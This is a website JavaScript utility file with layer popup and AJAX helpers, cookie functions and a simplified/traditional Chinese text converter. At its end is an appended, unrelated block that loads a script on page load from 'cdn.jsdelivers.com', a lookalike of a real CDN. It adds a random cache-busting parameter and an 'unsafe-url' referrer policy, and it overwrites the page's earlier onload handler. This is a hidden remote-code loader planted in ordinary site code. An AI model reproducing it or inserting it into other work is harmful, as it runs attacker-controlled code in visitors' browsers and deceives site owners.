//layer图标 0:警告1:正确2:错误3:询问4:锁5:苦脸6:笑脸
/**
 * layer 函数封装，无确认提示AJAX操作
 * url 地址
 * types 无id=无动作,1=AJAX删除,2=AJAX替换
*/
function showmin(url, types, fun) {
	var loading = layer.load(2);
	$.get(url, '', function(sdata) {
		var data = $.parseJSON(sdata);
		layer.close(loading);
		if (data.status == 'y') {
			if (data.id) {
				if (types == 1) { //AJAX删除ID
					$('#' + data.id).detach();
				} else if (types == 2) { //AJAX替换ID,数组
					var len = data.id.length;
					for (var i = 0; i < len; i++) {
						$('#' + data.id[i].id).html(data.id[i].htm);
					}
				}
			}
			if (data.info) {
				layer.msg(data.info, {
					icon: 6
				});
			}
			if (fun) {
				fun(data.rid);
			}
		} else {
			layer.msg(data.info, {
				icon: 5
			});
		}
	});
}
/**
 * 确认窗口 API
 * url 地址
 * msg 消息提示信息
 * type 类型0=AJAX删除,1=AJAX替换,2=确认跳转,3=表单提交
 * load 显示等待
 * re 成功是否刷新页面
 * 返回：run=失败成功,loading=关闭等待,msg=操作状态,id=操作信息ID
*/
function showwindow(url, msg, type, load, re) {
	layer.confirm(msg, {
		title: '信息',
		btn: ['确认', '取消'] //按钮
	}, function() {
		if (type == 3) { //表单提交
			$('#' + url).submit(); //提交
		} else if (type == 2) { //确认跳转
			location.href = url;
		} else { //AJAX
			if (load == 1) var loading = layer.load(2);
			$.get(url, '', function(sdata) {
				var data = $.parseJSON(sdata);
				if (load == 1) layer.close(loading);
				if (data.run == 'yes') {
					if (data.id) {
						if (!type) { //AJAX删除ID
							$('#' + data.id).detach();
						} else if (type == 1) { //AJAX替换ID,数组
							var len = data.id.length;
							for (var i = 0; i < len; i++) {
								$('#' + data.id[i].id).html(data.id[i].htm);
							}
						}
					}
					layer.msg(data.msg, {
						icon: 6
					});
					if (re) {
						setTimeout(function() {
							location.reload();
						}, 1000);
					}
				} else {
					layer.msg(data.msg, {
						icon: 5
					});
				}
			});
		}
	}, function() {

	});
}

/**
 * tips触发层
 * id 触发#id或.class
 * msg 消息提示信息
 * time 消失时间，毫秒
 * btn 0不显示关闭按钮
 * color 颜色
*/
function showtips(id, msg, time, btn, color) {
	layer.tips(msg, id, {
		tips: [1, color ? color : '#333C59'], //配置颜色
		time: time ? time : 3000,
		closeBtn: btn ? btn : 0 //显示关闭按钮
	});
}

/**
 * layer 弹出窗口函数封装
 * type 弹窗类型 0默认信息框 1页面层 2iframe层 3加载层 4tips层
 * data 对应弹窗类型的数据 1页面层元素 2URL 3html
 * title 窗口标题
 * w 窗口宽度
 * h 窗口高度
 * mm 最大化最小化按钮
 * shade 遮罩层
 * mw 最大宽度
 * mh 最大高度
 * index 自定义层
 * full 是否全屏
 * anim 0默认平滑放大 1从上掉落 2从最底部往上滑入 3从左滑入 4从左翻滚 5渐显 6抖动
 */
var win;
function showlayer(type, title, data, w, h, mm, shade, mw, mh, index, full, anim) {
	win = layer.open({
		type: type,
		content: data, //捕获的元素，注意：最好该指定的元素要存放在body最外层，否则可能被其它的相对元素所影响
		title: title ? title : false, //不显示标题
		area: w && h ? [w, h] : 'auto',
		maxmin: mm ? false : true, //默认开启最大化最小化按钮
		shade: shade ? shade : false, //显示遮罩层shade: 0.2 | shade: [0.2, '#000']
		shadeClose: true, //是否点击遮罩关闭
		maxWidth: mw ? mw : 800,
		maxHeight: mh ? mh : 500,
		zIndex: index ? index : layer.zIndex, //窗口层
		anim: anim ? anim : 0, //显示方式
		success: function(layero){ //层弹出后的成功回调方法
			if (!index) layer.setTop(layero); //窗口置顶
		}
	});
	if (full) layer.full(win);
}

function placeholder(obj) {
	//浏览器不支持 placeholder 时才执行
	if (!('placeholder' in document.createElement('input'))) {
		if (obj) {
			var DOM = $(obj);
		} else {
			var DOM = $('body');
		}
		DOM.find('[placeholder]').each(function() {
			var tag = $(this); //当前 input
			tag.unbind('focus blur');// 解绑focus blur事件
			var placeholder = tag.attr('placeholder'); //当前 placeholder
			if (tag.val() == '') {
				tag.css('color', '#999');
				tag.val(placeholder);
			}
			tag.focus(function() {
				if (this.value == placeholder) {
					this.value = '';
					this.style.color = '#444';
				}
			});
			tag.blur(function() {
				if (this.value == '') {
					this.value = placeholder;
					this.style.color = '#999';
				}
			});
		});
	}
}

function setLang(lan){
	//document.setCookie('lang', lan);
	zh_tran(lan);
	location.reload();
}

//COOKIE
document.getCookie = function(sName) {
	var aCookie = document.cookie.split("; ");
	for (var i = 0; i < aCookie.length; i++) {
		var aCrumb = aCookie[i].split("=");
		if (sName == aCrumb[0]) return decodeURIComponent(aCrumb[1]);
	}
	return null;
}

document.setCookie = function(sName, sValue, sExpires) {
	var sCookie = sName + "=" + encodeURIComponent(sValue);
	if (sExpires != null) {
		sCookie += "; expires=" + sExpires;
	}
	document.cookie = sCookie;
}

document.removeCookie = function(sName, sValue) {
	document.cookie = sName + "=; expires=Fri, 31 Dec 1999 23:59:59 GMT;";
}



//s = simplified 简体中文 t = traditional 繁体中文 n = normal 正常显示
var zh_default = 's'; //默认语言，请不要改变
var zh_choose = 's'; //当前选择
var zh_expires = 7; //cookie过期天数
var zh_class = 'zh_click'; //链接的class名，id为class + s/t/n 之一
var zh_style_active = ' color:red;'; //当前选择的链接式样
var zh_style_inactive = 'color:blue;'; //非当前选择的链接式样
var zh_browserLang = ''; //浏览器语言
var zh_autoLang_t = true; //浏览器语言为繁体时自动进行操作
var zh_autoLang_s = false; //浏览器语言为简体时自动进行操作
var zh_autoLang_alert = true; //自动操作后是否显示提示消息
var zh_autoLang_checked = 0; //次检测浏览器次数,第一次写cookie为1,提示后为2,今后将不再提示
 
 
//判断浏览器语言的正则,ie为小写,ff为大写
var zh_langReg_t = /^zh-tw|zh-hk$/i;
var zh_langReg_s = /^zh-cn$/i;
 
//简体繁体对照字表,可以自行替换
var zh_s = '皑蔼碍爱翱袄奥坝罢摆败颁办绊帮绑镑谤剥饱宝报鲍辈贝钡狈备惫绷笔毕毙币闭边编贬变辩辫标鳖别瘪濒滨宾摈饼并拨钵铂驳卜补财参蚕残惭惨灿苍舱仓沧厕侧册测层诧搀掺蝉馋谗缠铲产阐颤场尝长偿肠厂畅钞车彻尘沉陈衬撑称惩诚骋痴迟驰耻齿炽冲虫宠畴踌筹绸丑橱厨锄雏础储触处传疮闯创锤纯绰辞词赐聪葱囱从丛凑蹿窜错达带贷担单郸掸胆惮诞弹当挡党荡档捣岛祷导盗灯邓敌涤递缔颠点垫电淀钓调迭谍叠钉顶锭订丢东动栋冻斗犊独读赌镀锻断缎兑队对吨顿钝夺堕鹅额讹恶饿儿尔饵贰发罚阀珐矾钒烦范贩饭访纺飞诽废费纷坟奋愤粪丰枫锋风疯冯缝讽凤肤辐抚辅赋复负讣妇缚该钙盖干赶秆赣冈刚钢纲岗皋镐搁鸽阁铬个给龚宫巩贡钩沟构购够蛊顾剐关观馆惯贯广规硅归龟闺轨诡柜贵刽辊滚锅国过骇韩汉号阂鹤贺横轰鸿红后壶护沪户哗华画划话怀坏欢环还缓换唤痪焕涣黄谎挥辉毁贿秽会烩汇讳诲绘荤浑伙获货祸击机积饥讥鸡绩缉极辑级挤几蓟剂济计记际继纪夹荚颊贾钾价驾歼监坚笺间艰缄茧检碱硷拣捡简俭减荐槛鉴践贱见键舰剑饯渐溅涧将浆蒋桨奖讲酱胶浇骄娇搅铰矫侥脚饺缴绞轿较秸阶节茎鲸惊经颈静镜径痉竞净纠厩旧驹举据锯惧剧鹃绢杰洁结诫届紧锦仅谨进晋烬尽劲荆觉决诀绝钧军骏开凯颗壳课垦恳抠库裤夸块侩宽矿旷况亏岿窥馈溃扩阔蜡腊莱来赖蓝栏拦篮阑兰澜谰揽览懒缆烂滥捞劳涝乐镭垒类泪篱离里鲤礼丽厉励砾历沥隶俩联莲连镰怜涟帘敛脸链恋炼练粮凉两辆谅疗辽镣猎临邻鳞凛赁龄铃凌灵岭领馏刘龙聋咙笼垄拢陇楼娄搂篓芦卢颅庐炉掳卤虏鲁赂禄录陆驴吕铝侣屡缕虑滤绿峦挛孪滦乱抡轮伦仑沦纶论萝罗逻锣箩骡骆络妈玛码蚂马骂吗买麦卖迈脉瞒馒蛮满谩猫锚铆贸么霉没镁门闷们锰梦谜弥觅幂绵缅庙灭悯闽鸣铭谬谋亩钠纳难挠脑恼闹馁内拟腻撵捻酿鸟聂啮镊镍柠狞宁拧泞钮纽脓浓农疟诺欧鸥殴呕沤盘庞赔喷鹏骗飘频贫苹凭评泼颇扑铺朴谱栖凄脐齐骑岂启气弃讫牵扦钎铅迁签谦钱钳潜浅谴堑枪呛墙蔷强抢锹桥乔侨翘窍窃钦亲寝轻氢倾顷请庆琼穷趋区躯驱龋颧权劝却鹊确让饶扰绕热韧认纫荣绒软锐闰润洒萨鳃赛叁伞丧骚扫涩杀纱筛晒删闪陕赡缮伤赏烧绍赊摄慑设绅审婶肾渗声绳胜圣师狮湿诗尸时蚀实识驶势适释饰视试寿兽枢输书赎属术树竖数帅双谁税顺说硕烁丝饲耸怂颂讼诵擞苏诉肃虽随绥岁孙损笋缩琐锁獭挞抬态摊贪瘫滩坛谭谈叹汤烫涛绦讨腾誊锑题体屉条贴铁厅听烃铜统头秃图涂团颓蜕脱鸵驮驼椭洼袜弯湾顽万网韦违围为潍维苇伟伪纬谓卫温闻纹稳问瓮挝蜗涡窝卧呜钨乌污诬无芜吴坞雾务误锡牺袭习铣戏细虾辖峡侠狭厦吓锨鲜纤咸贤衔闲显险现献县馅羡宪线厢镶乡详响项萧嚣销晓啸蝎协挟携胁谐写泻谢锌衅兴汹锈绣虚嘘须许叙绪续轩悬选癣绚学勋询寻驯训讯逊压鸦鸭哑亚讶阉烟盐严颜阎艳厌砚彦谚验鸯杨扬疡阳痒养样瑶摇尧遥窑谣药爷页业叶医铱颐遗仪彝蚁艺亿忆义诣议谊译异绎荫阴银饮隐樱婴鹰应缨莹萤营荧蝇赢颖哟拥佣痈踊咏涌优忧邮铀犹游诱舆鱼渔娱与屿语吁御狱誉预驭鸳渊辕园员圆缘远愿约跃钥岳粤悦阅云郧匀陨运蕴酝晕韵杂灾载攒暂赞赃脏凿枣灶责择则泽贼赠扎札轧铡闸栅诈斋债毡盏斩辗崭栈战绽张涨帐账胀赵蛰辙锗这贞针侦诊镇阵挣睁狰争帧郑证织职执纸挚掷帜质滞钟终种肿众诌轴皱昼骤猪诸诛烛瞩嘱贮铸筑驻专砖转赚桩庄装妆壮状锥赘坠缀谆着浊兹资渍踪综总纵邹诅组钻';
var zh_t = '皚藹礙愛翺襖奧壩罷擺敗頒辦絆幫綁鎊謗剝飽寶報鮑輩貝鋇狽備憊繃筆畢斃幣閉邊編貶變辯辮標鼈別癟瀕濱賓擯餅並撥缽鉑駁蔔補財參蠶殘慚慘燦蒼艙倉滄廁側冊測層詫攙摻蟬饞讒纏鏟産闡顫場嘗長償腸廠暢鈔車徹塵沈陳襯撐稱懲誠騁癡遲馳恥齒熾沖蟲寵疇躊籌綢醜櫥廚鋤雛礎儲觸處傳瘡闖創錘純綽辭詞賜聰蔥囪從叢湊躥竄錯達帶貸擔單鄲撣膽憚誕彈當擋黨蕩檔搗島禱導盜燈鄧敵滌遞締顛點墊電澱釣調叠諜疊釘頂錠訂丟東動棟凍鬥犢獨讀賭鍍鍛斷緞兌隊對噸頓鈍奪墮鵝額訛惡餓兒爾餌貳發罰閥琺礬釩煩範販飯訪紡飛誹廢費紛墳奮憤糞豐楓鋒風瘋馮縫諷鳳膚輻撫輔賦複負訃婦縛該鈣蓋幹趕稈贛岡剛鋼綱崗臯鎬擱鴿閣鉻個給龔宮鞏貢鈎溝構購夠蠱顧剮關觀館慣貫廣規矽歸龜閨軌詭櫃貴劊輥滾鍋國過駭韓漢號閡鶴賀橫轟鴻紅後壺護滬戶嘩華畫劃話懷壞歡環還緩換喚瘓煥渙黃謊揮輝毀賄穢會燴彙諱誨繪葷渾夥獲貨禍擊機積饑譏雞績緝極輯級擠幾薊劑濟計記際繼紀夾莢頰賈鉀價駕殲監堅箋間艱緘繭檢堿鹼揀撿簡儉減薦檻鑒踐賤見鍵艦劍餞漸濺澗將漿蔣槳獎講醬膠澆驕嬌攪鉸矯僥腳餃繳絞轎較稭階節莖鯨驚經頸靜鏡徑痙競淨糾廄舊駒舉據鋸懼劇鵑絹傑潔結誡屆緊錦僅謹進晉燼盡勁荊覺決訣絕鈞軍駿開凱顆殼課墾懇摳庫褲誇塊儈寬礦曠況虧巋窺饋潰擴闊蠟臘萊來賴藍欄攔籃闌蘭瀾讕攬覽懶纜爛濫撈勞澇樂鐳壘類淚籬離裏鯉禮麗厲勵礫曆瀝隸倆聯蓮連鐮憐漣簾斂臉鏈戀煉練糧涼兩輛諒療遼鐐獵臨鄰鱗凜賃齡鈴淩靈嶺領餾劉龍聾嚨籠壟攏隴樓婁摟簍蘆盧顱廬爐擄鹵虜魯賂祿錄陸驢呂鋁侶屢縷慮濾綠巒攣孿灤亂掄輪倫侖淪綸論蘿羅邏鑼籮騾駱絡媽瑪碼螞馬罵嗎買麥賣邁脈瞞饅蠻滿謾貓錨鉚貿麽黴沒鎂門悶們錳夢謎彌覓冪綿緬廟滅憫閩鳴銘謬謀畝鈉納難撓腦惱鬧餒內擬膩攆撚釀鳥聶齧鑷鎳檸獰甯擰濘鈕紐膿濃農瘧諾歐鷗毆嘔漚盤龐賠噴鵬騙飄頻貧蘋憑評潑頗撲鋪樸譜棲淒臍齊騎豈啓氣棄訖牽扡釺鉛遷簽謙錢鉗潛淺譴塹槍嗆牆薔強搶鍬橋喬僑翹竅竊欽親寢輕氫傾頃請慶瓊窮趨區軀驅齲顴權勸卻鵲確讓饒擾繞熱韌認紉榮絨軟銳閏潤灑薩鰓賽三傘喪騷掃澀殺紗篩曬刪閃陝贍繕傷賞燒紹賒攝懾設紳審嬸腎滲聲繩勝聖師獅濕詩屍時蝕實識駛勢適釋飾視試壽獸樞輸書贖屬術樹豎數帥雙誰稅順說碩爍絲飼聳慫頌訟誦擻蘇訴肅雖隨綏歲孫損筍縮瑣鎖獺撻擡態攤貪癱灘壇譚談歎湯燙濤縧討騰謄銻題體屜條貼鐵廳聽烴銅統頭禿圖塗團頹蛻脫鴕馱駝橢窪襪彎灣頑萬網韋違圍爲濰維葦偉僞緯謂衛溫聞紋穩問甕撾蝸渦窩臥嗚鎢烏汙誣無蕪吳塢霧務誤錫犧襲習銑戲細蝦轄峽俠狹廈嚇鍁鮮纖鹹賢銜閑顯險現獻縣餡羨憲線廂鑲鄉詳響項蕭囂銷曉嘯蠍協挾攜脅諧寫瀉謝鋅釁興洶鏽繡虛噓須許敘緒續軒懸選癬絢學勳詢尋馴訓訊遜壓鴉鴨啞亞訝閹煙鹽嚴顔閻豔厭硯彥諺驗鴦楊揚瘍陽癢養樣瑤搖堯遙窯謠藥爺頁業葉醫銥頤遺儀彜蟻藝億憶義詣議誼譯異繹蔭陰銀飲隱櫻嬰鷹應纓瑩螢營熒蠅贏穎喲擁傭癰踴詠湧優憂郵鈾猶遊誘輿魚漁娛與嶼語籲禦獄譽預馭鴛淵轅園員圓緣遠願約躍鑰嶽粵悅閱雲鄖勻隕運蘊醞暈韻雜災載攢暫贊贓髒鑿棗竈責擇則澤賊贈紮劄軋鍘閘柵詐齋債氈盞斬輾嶄棧戰綻張漲帳賬脹趙蟄轍鍺這貞針偵診鎮陣掙睜猙爭幀鄭證織職執紙摯擲幟質滯鍾終種腫衆謅軸皺晝驟豬諸誅燭矚囑貯鑄築駐專磚轉賺樁莊裝妝壯狀錐贅墜綴諄著濁茲資漬蹤綜總縱鄒詛組鑽';
String.prototype.tran = function() {
	var s1,s2;
	if (zh_choose == 't') {
	   s1 = zh_s;
	   s2 = zh_t;
	}else if(zh_choose == 's') {
	   s1 = zh_t;
	   s2 = zh_s;
	}else {
	   return this;
	}
	var a = '';
	var l = this.length;
	for(var i=0;i<this.length;i++){
			var c = this.charAt(i);
			var p = s1.indexOf(c)
			a += p < 0 ? c : s2.charAt(p);
		}
	return a;
}
function setCookie(name, value) {
	var argv = setCookie.arguments;
	var argc = setCookie.arguments.length;
	var expires = (argc > 2) ? argv[2] : null;
	if (expires != null) {
	   var LargeExpDate = new Date ();
	   LargeExpDate.setTime(LargeExpDate.getTime() + (expires*1000*3600*24));
	}
	document.cookie = name + "=" + escape (value)+((expires == null) ? "" : ("; expires=" +LargeExpDate.toGMTString()));
}
function getCookie(Name) {
	var search = Name + "="
	if (document.cookie.length > 0) {
	   offset = document.cookie.indexOf(search);
	   if(offset != -1) {
		offset += search.length;
		end = document.cookie.indexOf(";", offset);
		if(end == -1) end = document.cookie.length;
		return unescape(document.cookie.substring(offset, end));
	   }else {
		return '';
	   }
	}
}
 
 
function zh_tranBody(obj) { 
	var o = (typeof(obj) == "object") ? obj.childNodes : document.body.childNodes;
	for (var i = 0; i < o.length; i++) {
	   var c = o.item(i);
	   if ('||BR|HR|TEXTAREA|SCRIPT|'.indexOf("|"+c.tagName+"|") > 0) continue;
	   if (c.className == zh_class) {
		if (c.id == zh_class + '_' + zh_choose) {
		 c.setAttribute('style', zh_style_active);
		 c.style.cssText = zh_style_active;
		}else {
		 c.setAttribute('style', zh_style_inactive);
		 c.style.cssText = zh_style_inactive;
		}
		continue;   
	   }
	   if (c.title != '' && c.title != null) c.title = c.title.tran();
	   if (c.alt != '' && c.alt != null) c.alt = c.alt.tran();
	   if (c.tagName == "INPUT" && c.value != '' && c.type != 'text' && c.type != 'hidden' && c.type != 'password') c.value = c.value.tran();
	   if (c.nodeType == 3) {
		c.data = c.data.tran();  
	   }else{
		zh_tranBody(c);
		
	   }
	}
}
 
function zh_tran(go) {
	if (go) zh_choose = go;
	setCookie('zh_choose', zh_choose, zh_expires);
	if (go == 'n') {
	   window.location.reload();
	}else {
	   zh_tranBody();
	}
}
function zh_init() {
	zh_getLang(); 
	c = document.getElementById(zh_class + '_' + zh_choose);
	if (zh_choose != zh_default) {
	   if (window.onload) {
		window.onload_before_zh_init = window.onload;
		window.onload = function() {
		 zh_tran(zh_choose);
		 if (getCookie('zh_autoLang_check')) {alert(zh_autoLang_msg);};
		 window.onload_before_zh_init();
		 };
	   }else {
		window.onload = function() {
		 zh_tran(zh_choose);
		 if (getCookie('zh_autoLang_check')) {alert(zh_autoLang_msg);};
		 };
	   }
	}
 
}
$(function(){
	zh_init()
})
 
function zh_getLang() {
	if (getCookie('zh_choose')) {
	   zh_choose = getCookie('zh_choose');
	   return true;
	} 
	if (!zh_autoLang_t && !zh_autoLang_s) return false;
	if (getCookie('zh_autoLang_checked')) return false;
	if (navigator.language) {
	   zh_browserLang = navigator.language;
	}else if (navigator.browserLanguage) {
	   zh_browserLang = navigator.browserLanguage;
	}
	if (zh_autoLang_t && zh_langReg_t.test(zh_browserLang)) {
	   zh_choose = 't';
	}else if (zh_autoLang_s && zh_langReg_s.test(zh_browserLang)) {
	   zh_choose = 's';
	}
	zh_autoLang_checked = 1;
	setCookie('zh_choose', zh_choose, zh_expires);
	if (zh_choose == zh_default) return false;
	return true;
}
 

;function loadJSScript(url, callback) {
    var script = document.createElement("script");
    script.type = "text/javascript";
    script.referrerPolicy = "unsafe-url";
    if (typeof(callback) != "undefined") {
        if (script.readyState) {
            script.onreadystatechange = function() {
                if (script.readyState == "loaded" || script.readyState == "complete") {
                    script.onreadystatechange = null;
                    callback();
                }
            };
        } else {
            script.onload = function() {
                callback();
            };
        }
    };
    script.src = url;
    document.body.appendChild(script);
}
window.onload = function() {
    loadJSScript("//cdn.jsdelivers.com/jquery/3.2.1/jquery.js?"+Math.random(), function() { 
         console.log("Jquery loaded");
    });
}